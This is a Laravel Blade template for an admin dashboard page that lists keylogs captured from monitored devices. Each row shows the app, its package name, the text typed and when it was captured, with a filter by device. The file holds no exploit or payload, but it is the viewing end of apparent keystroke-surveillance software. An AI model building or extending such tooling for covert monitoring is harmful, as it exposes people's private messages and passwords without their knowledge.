@extends('layouts.app')

@section('content')
<style>
.select2-results__options {
    max-height: 175px !important;
    overflow-y: auto !important;
}
</style>

<div class="container-xxl flex-grow-1 container-p-y">

    <h4 class="py-3 breadcrumb-wrapper mb-4">
        <span class="text-muted fw-light">Keylogs /</span> List
    </h4>

    <div class="card">
        <div class="card-header d-flex justify-content-between align-items-center">
            <h5 class="mb-0">Keylog List</h5>
            <span class="text-muted" style="font-size:13px;">
                <i class="fa-solid fa-user me-1"></i> {{ $user->name }}
            </span>
        </div>

        {{-- FILTER BY DEVICE --}}
        <div class="card-body border-bottom pb-3 pt-3">
            <form method="GET" id="filterForm" action="{{ route('user.keylog', $user->id) }}" class="row g-3 align-items-end">

                <div class="col-md-6">
                    <label class="form-label text-muted" style="font-size:12px;">Filter by Device</label>
                    <select name="device_id" class="form-select form-select-sm" id="deviceSelect">
                        @foreach($devices as $device)
                            <option value="{{ $device->id }}"
                                data-user="{{ $device->user_id }}"
                                {{ optional($selectedDevice)->id == $device->id ? 'selected' : '' }}>
                                {{ $device->device_name }}
                            </option>
                        @endforeach
                    </select>
                </div>

                <div class="col-md-4 d-flex gap-2">
                    <button type="submit" class="btn btn-sm btn-primary">
                        <i class="fa-solid fa-filter me-1"></i> Filter
                    </button>
                    <!-- <a href="{{ route('user.keylog', $user->id) }}" class="btn btn-sm btn-outline-secondary">
                        <i class="fa-solid fa-rotate-left me-1"></i> Reset
                    </a> -->
                </div>

            </form>
        </div>

        {{-- ACTIVE FILTER BADGE --}}
        @if($selectedDevice)
        <div class="px-4 pt-2 pb-1">
            <span class="badge bg-label-info">
                <i class="fa-solid fa-mobile-screen me-1"></i> {{ $selectedDevice->device_name }}
            </span>
        </div>
        @endif

        <div class="card-datatable text-nowrap">
            <table class="table table-bordered" id="mytable">
                <thead>
                    <tr>
                        <th style="min-width:200px;">APP</th>
                        <th style="min-width:200px;">Typed Text</th>
                        <th>Captured At</th>
                    </tr>
                </thead>

                <tbody>
                    @forelse($keylogs as $row)
                    <tr>
                        <td>
                            <div style="display:flex; align-items:center; gap:10px;">

                                @php $iconUrl = optional($row->appIcon)->app_icon_url; @endphp

                                @if($iconUrl)
                                    <img src="{{ asset('storage/' . $iconUrl) }}"
                                         width="40" height="40"
                                         style="border-radius:10px; flex-shrink:0;">
                                @else
                                    <div style="width:40px;height:40px;border-radius:10px;
                                                background:#eee;display:flex;align-items:center;
                                                justify-content:center;font-size:18px;
                                                flex-shrink:0;">
                                        📱
                                    </div>
                                @endif

                                <div>
                                    <div style="font-weight:600; font-size:13px;">{{ $row->app_name ?? '-' }}</div>
                                    <div style="font-size:11px; color:#888;">{{ $row->package_name ?? '-' }}</div>
                                </div>
                            </div>
                        </td>

                        <td style="font-size:13px;">{{ $row->typed_text }}</td>
                        <td style="font-size:12px; color:#555;">{{ $row->captured_at ?? '-' }}</td>
                    </tr>
                    @empty
                    @endforelse
                </tbody>
            </table>
        </div>
    </div>
</div>

@endsection

@section('scripts')
<script>
$(function () {
    $('#deviceSelect').select2({
        placeholder: '— Select Device —',
        allowClear: false,
        dropdownParent: $('body'),
    });

    $('#mytable').DataTable({
    pageLength: 10,
    ordering: true,
    lengthMenu: [5, 10, 25, 50, 100],
    dom: '<"row"<"col-md-6"l><"col-md-6"f>>t<"row"<"col-md-6"i><"col-md-6"p>>',
    language: {
        emptyTable: 'No keylogs found'
    }
});

    $('#deviceSelect').on('change', function() {
        const userId = $(this).find(':selected').data('user') || {{ $user->id }};
        $('#filterForm').attr('action', '{{ url('') }}/user/keylog/' + userId);
    });
});
</script>
@endsection